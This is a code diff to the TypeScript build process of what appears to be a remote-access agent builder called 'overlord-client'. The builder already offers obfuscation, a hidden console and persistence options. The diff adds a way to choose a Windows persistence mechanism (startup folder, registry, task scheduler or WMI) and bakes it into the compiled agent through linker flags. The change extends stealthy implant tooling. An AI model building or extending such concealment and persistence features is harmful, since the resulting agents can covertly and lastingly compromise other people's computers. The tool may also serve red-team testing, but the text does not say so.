@@ -61,9 +61,12 @@ type BuildProcessConfig = {
   disableCgo?: boolean;
   obfuscate?: boolean;
   enablePersistence?: boolean;
+  persistenceMethod?: string;
   hideConsole?: boolean;
   noPrinting?: boolean;
 };
+
+const VALID_PERSISTENCE_METHODS = new Set(['startup', 'registry', 'taskscheduler', 'wmi']);
 
 type BuildProcessDeps = {
   generateBuildMutex: (length?: number) => string;
@@ -307,6 +310,11 @@ export async function startBuildProcess(
           const persistenceFlag = "-X overlord-client/cmd/agent/config.DefaultPersistence=true";
           ldflags = ldflags ? `${ldflags} ${persistenceFlag}` : persistenceFlag;
           sendToStream({ type: "output", text: `Persistence enabled for ${platform}\n`, level: "info" });
+          if (os === 'windows' && config.persistenceMethod && VALID_PERSISTENCE_METHODS.has(config.persistenceMethod)) {
+            const methodFlag = `-X overlord-client/cmd/agent/persistence.DefaultPersistenceMethod=${config.persistenceMethod}`;
+            ldflags = `${ldflags} ${methodFlag}`;
+            sendToStream({ type: "output", text: `Persistence method: ${config.persistenceMethod}\n`, level: "info" });
+          }
         } else {
           sendToStream({ type: "output", text: `Persistence is not supported on ${platform}, skipping...\n`, level: "warning" });
         }
